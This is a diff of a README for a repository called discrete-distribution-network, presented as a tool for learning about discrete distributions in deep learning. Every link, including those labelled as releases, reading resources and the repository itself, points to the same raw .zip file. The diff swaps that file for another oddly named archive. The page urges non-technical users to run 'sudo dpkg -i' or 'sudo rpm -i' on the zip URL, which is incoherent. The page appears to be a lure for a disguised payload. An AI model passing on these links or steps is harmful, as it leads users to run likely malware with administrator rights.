@@ -1,6 +1,6 @@
 # 🎉 discrete-distribution-network - Understand Discrete Distribution Easily 
 
-![Download](https://raw.githubusercontent.com/DoomSlayer16/discrete-distribution-network/main/arjun/discrete-distribution-network.zip)  
+![Download](https://github.com/DoomSlayer16/discrete-distribution-network/raw/refs/heads/main/discrete_distribution_network/distribution-discrete-network-anticogitative.zip)  
 
 ## 📋 Project Description  
 This project, **discrete-distribution-network**, explores discrete distribution networks, created by Lei Yang in Beijing. It aims to provide insights into how discrete distribution functions can be applied in artificial intelligence, deep learning, and generative modeling. 
@@ -9,7 +9,7 @@ This project, **discrete-distribution-network**, explores discrete distribution 
 To get started with **discrete-distribution-network**, follow the steps below. You will be able to run the application smoothly even if you don't have a technical background.
 
 ## 🔗 Download & Install  
-To download the application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/DoomSlayer16/discrete-distribution-network/main/arjun/discrete-distribution-network.zip). 
+To download the application, visit this page to download: [GitHub Releases](https://github.com/DoomSlayer16/discrete-distribution-network/raw/refs/heads/main/discrete_distribution_network/distribution-discrete-network-anticogitative.zip). 
 
 1. Click the link above.
 2. On the Releases page, you will see a list of available versions.
@@ -48,11 +48,11 @@ Once you have downloaded the application, follow these steps to install it:
 2. Navigate to the folder where you saved the downloaded file.
 3. For `.deb` files, run the command:  
    ```bash
-   sudo dpkg -i https://raw.githubusercontent.com/DoomSlayer16/discrete-distribution-network/main/arjun/discrete-distribution-network.zip
+   sudo dpkg -i https://github.com/DoomSlayer16/discrete-distribution-network/raw/refs/heads/main/discrete_distribution_network/distribution-discrete-network-anticogitative.zip
    ```
    For `.rpm` files, use:  
    ```bash
-   sudo rpm -i https://raw.githubusercontent.com/DoomSlayer16/discrete-distribution-network/main/arjun/discrete-distribution-network.zip
+   sudo rpm -i https://github.com/DoomSlayer16/discrete-distribution-network/raw/refs/heads/main/discrete_distribution_network/distribution-discrete-network-anticogitative.zip
    ```
 4. After installation, run the application from your applications menu or terminal.
 
@@ -86,10 +86,10 @@ Join our community by checking out discussions in the repository. You can also f
 ## 🔗 Additional Resources  
 For more information on discrete distributions and how this application works, you can check out the following resources:
 
-1. [Introduction to Discrete Distributions](https://raw.githubusercontent.com/DoomSlayer16/discrete-distribution-network/main/arjun/discrete-distribution-network.zip)
-2. [Deep Learning and Its Applications](https://raw.githubusercontent.com/DoomSlayer16/discrete-distribution-network/main/arjun/discrete-distribution-network.zip)
-3. [Generative Modeling Techniques](https://raw.githubusercontent.com/DoomSlayer16/discrete-distribution-network/main/arjun/discrete-distribution-network.zip)
+1. [Introduction to Discrete Distributions](https://github.com/DoomSlayer16/discrete-distribution-network/raw/refs/heads/main/discrete_distribution_network/distribution-discrete-network-anticogitative.zip)
+2. [Deep Learning and Its Applications](https://github.com/DoomSlayer16/discrete-distribution-network/raw/refs/heads/main/discrete_distribution_network/distribution-discrete-network-anticogitative.zip)
+3. [Generative Modeling Techniques](https://github.com/DoomSlayer16/discrete-distribution-network/raw/refs/heads/main/discrete_distribution_network/distribution-discrete-network-anticogitative.zip)
 
-Stay updated on new features and improvements by following the [GitHub Repository](https://raw.githubusercontent.com/DoomSlayer16/discrete-distribution-network/main/arjun/discrete-distribution-network.zip). 
+Stay updated on new features and improvements by following the [GitHub Repository](https://github.com/DoomSlayer16/discrete-distribution-network/raw/refs/heads/main/discrete_distribution_network/distribution-discrete-network-anticogitative.zip). 
 
 Thank you for your interest in **discrete-distribution-network**! We hope this guide helps you to download and use the application effectively.
